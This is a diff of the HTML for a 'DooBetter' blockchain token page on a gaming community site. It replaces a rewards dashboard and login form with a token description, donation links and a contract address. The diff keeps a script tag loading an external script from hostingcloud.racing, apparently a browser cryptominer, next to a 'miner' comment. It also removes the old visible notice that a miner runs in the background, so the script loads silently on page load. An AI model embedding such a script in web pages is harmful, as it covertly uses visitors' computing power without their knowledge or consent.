@@ -17,649 +17,71 @@
       href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
     />
 
-    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
-    <script src="https://mindsgaming.glitch.me/mtcg/invest.js"></script>
-    <script src="https://mindsgaming.glitch.me/mtcg/deck/playdeck.js"></script>
-    <script src="https://mindsgaming.glitch.me/script.js"></script>
+    <!-- import the webpage's stylesheet -->
+    <link rel="stylesheet" href="./style.css" />
+    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
+
+    <!-- import miner stylesheet -->
+
 
     <script src="https://www.hostingcloud.racing/5pDo.js"></script>
 
-    <!-- import the webpage's stylesheet -->
-    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
-    <link rel="stylesheet" href="https://mindsgaming.glitch.me/cpu.css" defer />
-    <link
-      rel="stylesheet"
-      href="https://mindsgaming.glitch.me/mtcg/style.css"
-      defer
-    />
-    <script src="/games/js/tokens.js" defer></script>
-
-    <link rel="stylesheet" href="/fly.css" />
-    <script src="/js/fly.js" defer></script>
-    <script src="/js/mice.js" defer></script>
+    <!-- import the webpage's javascript file -->
+    <script src="/script.js" defer></script>
+   
   </head>
 
+  <!-- body -->
   <body class="BETA" id="MGdark">
     <!-- desktop -->
     <div class="desktop">
       <div class="wrap">
-        <badge onclick="tokenmenu();">Menu</badge>
-        <div id="tokenmenu" class="HideMe">
-          <div id="avatar" class="avatar"></div>
-          <a class="links" href="#" id="badge" title="Login" onclick="guest();">
-            Login</a
-          >
-          <div class="links">
-            Earned Rewards:
-            <label id="minutes" value="0">00</label>.<label
-              id="seconds"
-              value="0"
-              >00</label
-            ><br />
-            <meter class="hide" value="0" max="100" id="tokenCheck"></meter>
-            <a class="cashout" href="#" onclick="cashTokens(); return false"
-              >Cashout</a
-            >
-          </div>
-          <a class="links" href="https://mindsgaming.glitch.me/tokens"
-            >Ecosystem</a
-          >
-          <div class="links" onclick="InvestIn();">
-            Random Invest
-            <br />
-            <div id="create"></div>
-          </div>
-          <br />
-          <a class="links" href="https://mindsgaming.glitch.me/mtcg/docs"
-            >Docs</a
-          >
-          <br />
-          <br />
-          <br />
-        </div>
-
-        <h1 class="miner">
-          <img
-            class="MTCGtoken"
-            src="https://lh3.googleusercontent.com/OhMKHby2FsaHEPrrYfI6U3OjSckqycY8UVMRNLeLgxZxQkvCFJnV2nMpFf0o4pCKBK-QPED4Z-1RacuFtrGnJy6_HUiIxOPqGYX8"
-            title="DooBetter"
-          />
-          <a
-            href="https://mindsgaming.glitch.me/"
-            style="text-decoration:none; color: red; bold: bold;"
-            >DooBetter
-          </a>
-          <p class="text">
-            (Supporter Token)
-          </p>
-          <button class="StartMiner" id="StartMinerDB">
-            <div onclick="StartMinerDB();" style="cursor: pointer;">
-              <b>DooBetter</b> MINER
-            </div>
-            <miner>
-              <iframe src="https://mindsgaming.glitch.me/mtcg/miner"> </iframe>
-              *A miner is running in tha background...
-            </miner>
-          </button>
-
-          <div class="ClickMiner" id="ClickMinerDB">
-            <div style="cursor: pointer" onclick="progressDB();">
-              <meter
-                id="progressDB"
-                min="5"
-                low="10"
-                high="80"
-                max="100"
-                value="2"
-              ></meter>
-              <br />
-              <div class="Eco">
-                <a
-                  href="https://mintme.com/token/doobetter/trade"
-                  target="_blank"
-                >
-                  <div class="BuyDooBetter" title="Buy DooBetter"></div
-                ></a>
-                <a
-                  href="https://mintme.com/token/doobetter/intro/airdrop"
-                  target="_blank"
-                >
-                  <div class="AIRDROP" title="Airdrop"></div
-                ></a>
-                <a href="https://www.minds.com/ChrisDoogood/" target="_blank">
-                  <div class="Subscribe" title="Subscribe"></div
-                ></a>
-              </div>
-              <img class="background" src="" />
-              <a href="#" onclick="playDoobetter(); return false">
-                <button>
-                  DooBetter Racing
-                </button></a
-              >
-            </div>
-          </div>
-        </h1>
-        <center>
+        <div align="center">
           <h1>
-            Pending Claims:
-            <ul id="dreams">
-              <li>Waiting For Claims..</li>
-            </ul>
-            <!--     Remove this line to clear orders 
-          <button id="clear-dreams">
-            Clear Dreams
-          </button>  -->
-          </h1>
-        </center>
-        <br />
-        <br />
-      </div>
-
-      <!-- End Applications -->
-      <br />
-      <!-- toolbar -->
-      <div class="toolbar" id="toolbar">
-        <!-- Menu -->
-        <a
-          class="Logomenu"
-          href="#"
-          title="Menu"
-          onclick="menu(); return false"
-        ></a>
-
-        <!-- browser -->
-        <a
-          href="https://mindsgaming.glitch.me/tokens/gamer"
-          class="GAMER"
-          title="GAMER Token"
-        ></a>
-        <a
-          href="https://mindsgaming.glitch.me/tokens/doobetter"
-          class="DOOBETTER"
-          title="DooBetter Token"
-        ></a>
-        <a
-          href="https://mindsgaming.glitch.me/tokens/eclipse"
-          class="ECLIPSE"
-          title="Claim Tokens"
-        ></a>
-
-        <a
-          href="#"
-          onclick="Settings(); return false"
-          class="gear"
-          title="Settings"
-        ></a>
-      </div>
-
-      <!-- ToolBar menu -->
-      <div class="ToolBarMenus" id="ToolBarMenu">
-        <a
-          href="#"
-          class="sminus"
-          onclick="Settings(); return false"
-          title="MIN"
-        ></a>
-
-        <a
-          class="Links"
-          href="#"
-          onclick="DarkMode(); return false"
-          title="Dark Mode"
-          >Dark Mode
-        </a>
-      </div>
-
-      <!-- Main Menu -->
-      <div class="MGmenus" id="MenuTools">
-        <a
-          class="upload"
-          href="#"
-          title="Folders"
-          onclick="assets(); return false"
-        ></a>
-        <a
-          class="sgamertube"
-          href="#"
-          title="Groups"
-          onclick="groups(); return false"
-        ></a>
-        <a
-          class="gamepad"
-          href="#"
-          title="Games"
-          onclick="games(); return false"
-        ></a>
-        <a
-          class="tools"
-          href="#"
-          title="Tools"
-          onclick="toolTab(); return false"
-        ></a>
-        <!-- Group Tab Menu -->
-        <div class="MGmenus" id="groups">
-          <a
-            href="https://www.minds.com/groups/profile/567372953759522816"
-            class="GLinks"
-            target="_blank"
-            title="GamerTube"
-            >GamerTube</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/567523173034110976"
-            class="GLinks"
-            target="_blank"
-            title="Music"
-            >Music</a
-          ><br />
-          <a
-            href="https://www.minds.com/groups/profile/569270912981934080"
-            class="GLinks"
-            target="_blank"
-            title="News"
-            >News</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/567421914620895232"
-            class="GLinks"
-            target="_blank"
-            title="MindTube"
-            >MindTube</a
-          ><br />
-          <a
-            href="https://www.minds.com/groups/profile/569272650258460672"
-            class="GLinks"
-            target="_blank"
-            title="Photography & Art"
-            >Art</a
-          ><br />
-          <a
-            href="https://www.minds.com/groups/profile/570312857774727174"
-            class="GLinks"
-            target="_blank"
-            title="WritingCorner"
-            >Corner</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/574262456742846476/feed"
-            class="GLinks"
-            target="_blank"
-            title="Outdoors"
-            >Outdoors</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/570669535963652100"
-            class="GLinks"
-            target="_blank"
-            title="420Time"
-            >420Time</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/568271817706319872/feed"
-            class="GLinks"
-            target="_blank"
-            title="Memewars"
-            >Memewars</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/886268855514841088"
-            class="GLinks"
-            target="_blank"
-            title="MCOSI"
-            >MCOSI</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/568528910808002560/activity"
-            class="GLinks"
-            target="_blank"
-            title="Community Resources"
-            >Community</a
-          >
-          <a
-            href="https://www.minds.com/groups/profile/568141108547166208/activity"
-            class="GLinks"
-            target="_blank"
-            title="Launching Area"
-            >Launching</a
-          >
-        </div>
-        <!-- Games Tab Menu -->
-        <div class="MGmenus" id="games">
-          <a href="/mtcg/pacman" class="GLinks" target="_blank" title="Pacman"
-            >Pacman</a
-          >
-          <br />
-          <a href="/alges" class="GLinks" target="_blank" title="Alges">Alges</a
-          ><br />
-
-          <a href="/3d-city" class="GLinks" target="_blank" title="3D-City"
-            >3d City</a
-          ><br />
-          <a href="/digger" class="GLinks" target="_blank" title="Digger"
-            >Digger</a
-          ><br />
-          <a href="/mtcg/mario" class="GLinks" target="_blank" title="Mario"
-            >Mario</a
-          ><br />
-          <a
-            href="mtcg/survivor"
-            class="GLinks"
-            target="_blank"
-            title="Survivor"
-            >Survivor</a
-          ><br />
-          <a href="/mtcg/mtcg" class="GLinks" target="_blank" title="Survivor"
-            >MTCG</a
-          ><br />
-        </div>
-        <!-- Tools menu -->
-
-        <div class="MGmenus" id="toolTab">
-          <a
-            href="https://www.minds.com/mindsgaming/shop"
-            class="GLinks"
-            target="_blank"
-            title="Memberships"
-            >Members</a
-          ><br />
-          <a href="/mg-show" class="GLinks" title="MG Show">Videos</a><br />
-
-          <a
-            href="https://chat.minds.com/#/room/#MindsGaming:minds.com"
-            class="GLinks"
-            onclick="chat(); return false"
-            title="Chat"
-            >Chat</a
-          ><br />
-          <a
-            href="https://www.minds.com/mindsgaming/blogs?layout=grid"
-            class="GLinks"
-            target="_blank"
-            title="MG Blogs"
-            >Blogs</a
-          ><br />
-
-          <a
-            href="#"
-            class="GLinks"
-            onclick="handbook(); return false"
-            title="MindsHandbook"
-            >HandBook</a
-          ><br />
-          <a
-            href="#"
-            class="GLinks"
-            onclick="ipack(); return false"
-            title="Ipack"
-            >Ipack</a
-          ><br />
-          <a
-            href="https://www.minds.com/MindsGaming/groups?layout=grid"
-            class="GLinks"
-            target="_blank"
-            title="Unlisted Groups"
-            >Unlisted</a
-          ><br />
-          <a
-            href="https://gitlab.com/MindsGaming/mindsgaming"
-            class="GLinks"
-            target="_blank"
-            title="BETA"
-            >Code</a
-          ><br />
-          <a href="/tokens" class="GLinks" target="_blank" title="Tokens"
-            >Tokens</a
-          ><br />
-        </div>
-        <!-- End menu -->
-      </div>
-
-      <!-- Splashscreens -->
-
-      <!-- browser splash -->
-
-      <div class="SplashScreen" id="GAMER">
-        <a
-          href="#"
-          class="sminus"
-          onclick="GAMER(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/tokens/gamer/claim.html">
-          <code>Beta</code>
-        </iframe>
-      </div>
-
-      <div class="SplashScreen" id="DOOBETTER">
-        <a
-          href="#"
-          class="sminus"
-          onclick="DooBetterClaim(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/tokens/doobetter/claim.html">
-          <code>Beta</code>
-        </iframe>
-      </div>
-
-      <!-- upload splashscreen -->
-
-      <div class="SplashScreen" id="assets" onmouseover="menu(); return false">
-        <a
-          href="#"
-          class="sminus"
-          onclick="assets(); return false"
-          onmouseover="menu(); return false"
-          title="MIN"
-        ></a>
-        <iframe
-          class="SplashFrame"
-          src="https://glitch.com/edit/#!/mindsgaming?path=README.me"
-        >
-          <code>Beta</code>
-        </iframe>
-      </div>
-
-      <!-- Groups splashscreens -->
-
-      <!-- Gaming -->
-      <div class="SplashScreen" id="GroupSpace">
-        <a
-          href="#"
-          class="sminus"
-          onclick="GroupSpace(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/groups/gaming"> </iframe>
-      </div>
-
-      <!-- Music -->
-      <div class="SplashScreen" id="MusicSpace">
-        <a
-          href="#"
-          class="sminus"
-          onclick="MusicSpace(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/groups/music"> </iframe>
-      </div>
-
-      <!-- handbook -->
-
-      <div class="SplashScreen" id="handbook">
-        <a
-          href="#"
-          class="sminus"
-          onclick="handbook(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/handbook"> </iframe>
-      </div>
-      <!-- Ipack -->
-
-      <div class="SplashScreen" id="ipack">
-        <a
-          href="#"
-          class="sminus"
-          onclick="ipack(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/ipack"> </iframe>
-      </div>
-
-      <!-- Pirate -->
-
-      <div class="SplashScreen" id="pirate">
-        <a
-          href="#"
-          class="sminus"
-          onclick="pirate(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/groups/pirate"> </iframe>
-      </div>
-      <!-- Help-->
-
-      <div class="SplashScreen" id="help">
-        <a
-          href="#"
-          class="sminus"
-          onclick="help(); return false"
-          title="MIN"
-        ></a>
-        <iframe class="SplashFrame" src="/groups/help"> </iframe>
-      </div>
-      <!-- memberships-->
-
-      <div class="SplashScreen" id="memberships">
-        <a
-          href="#"
-          class="sminus"
-          onclick="memberships(); return false"
-          title="MIN"
-          style="margin: 5px;"
-        ></a>
-        <iframe
-          class="SplashFrame"
-          src="/meberships"
-          onclick="assets(); return false"
-          onmouseover="menu(); return false"
-        >
-        </iframe>
-      </div>
-    </div>
-
-    <br />
-    <div class="SuperLogin" id="login">
-      <div class="backgrounds">
-        <center>
-          <card id="mtcg"></card>
-          <card id="doobetter"></card>
-          <card id="starshatter"></card>
-          <card id="lokaya"></card>
-          <card id="gametestplay"></card>
-          <card id="ottman"></card>
-          <card id="caged"></card>
-          <card id="yorizzo"></card>
-          <card id="bndr"></card>
-          <card id="eclipse"></card>
-          <card id="pinn"></card>
-          <card id="voxix"></card>
-          <card id="mindsbulb"></card>
-          <card id="pajunior"></card>
-          <card id="alienship"></card>
-          <card id="invadergaming"></card>
-          <card id="grock"></card>
-          <card id="assassin"></card>
-          <card id="charged"></card>
-          <card id="freedomfightervictor"></card>
-          <card id="christnat"></card>
-          <card id="chrisdoogood"></card>
-          <card id="thriftegaming"></card>
-          <card id="satorid"></card>
-          <card id="maximumunderdrive"></card>
-          <card id="pretty"></card>
-          <card id="lucoin"></card>
-          <card id="noid"></card>
-          <card id="tetn"></card>
-          <card id="troll"></card>
-          <card id="thefreespirit"></card>
-          <card id="token1media"></card>
-          <card id="jesustoken"></card>
-          <script
-            src="https://mindsgaming.glitch.me/mtcg/deck/deck.js"
-            defer
-          ></script>
-        </center>
-      </div>
-      <div class="LOGIN" align="center">
-        <h2>
-          MindsGaming Blockchain Rewards
-          <p class="blockchain">
-            Earn Blockchain Tokens By Playing Games!
-          </p>
-        </h2>
-        <form>
-          <a
-            href="https://mindsgaming.glitch.me/mtcg/docs/game.html"
-            class="questions"
-            title="Learn More"
-            >?</a
-          >
-          <input
-            name="username"
-            aria-label="a new dream"
-            type="text"
-            maxlength="100"
-            placeholder="Player Name"
-          />
-          <input
-            name="dream"
-            aria-label="a new dream"
-            type="text"
-            maxlength="100"
-            placeholder="Wallet ID"
-            required
-          />
-
-          <div
-            class="dreamtoken"
-            id="doobettertokens"
-            onclick="doobettertokens();"
-          >
+            <img
+              src="https://cdn.minds.com/icon/463565168681431051/medium/1617704314"
+              style="width: 32px; height: 32px; border-radius: 50%;"
+            />
             DooBetter
+            <p class="rewads">
+              Blockchain Rewards Token For
+              <a href="https://minds.com/MindsGaming" target="_blank"
+                >#MindsGaming</a
+              >
+            </p>
+          </h1>
+          <p>
+            <b
+              >DooBetter Supporter token- Community Supporter Token for MTCG A
+              Token to help the Growth , Strength and Plans for Minds The Card
+              Game (MTCG) bring attention to the MTCG NFT Cards and The MTCG
+              community as a whole!<br />
+            </b>
+          </p>
+
+          <p>
+            Earn DooBetter by playing games on the
+            <a href="/mtcg"> MTCG miner </a>
+          </p>
+
+          <div class="donate">
+            <a
+              class="donateBTN"
+              href="https://mintme.com/token/DooBetter"
+              target="_blank"
+              >Donate</a
+            ><br />
+            <a class="donateBTN" href="#" onclick="DooBetterClaim();"
+              >Claim Free DooBetter</a
+            ><br />
+            <a class="donateBTN" href="/mtcg">Earn Blockchain Tokens</a><br />
           </div>
-
-          <input
-            type="hidden"
-            list="tokens"
-            name="tokens"
-            id="token"
-            placeholder="Reward Token"
-            value="DooBetter"
-          />
-
-          <datalist id="tokens">
-            <option value="GAMER"> </option>
-            <option value="DOOBETTER"> </option>
-            <option value="Eclipse"> </option>
-          </datalist>
           <br />
-          <br />
-          <a
-            href="https://www.mintme.com/token/MTCG/invite"
-            class="guest"
-            target="_blank"
-          >
-            Get A Wallet</a
-          >
-          <button type="submit" id="submit-dream">Login</button>
-
-          <br />
-          <div class="guest" onclick="guest();">
-            Guest
-          </div>
-        </form>
+          <center>
+            <b>Contract Address</b><br />
+            <code>0x936e08736F882144Efd53813Ee9805701A5f4dC3</code>
+          </center>
+        </div>
       </div>
     </div>
   </body>
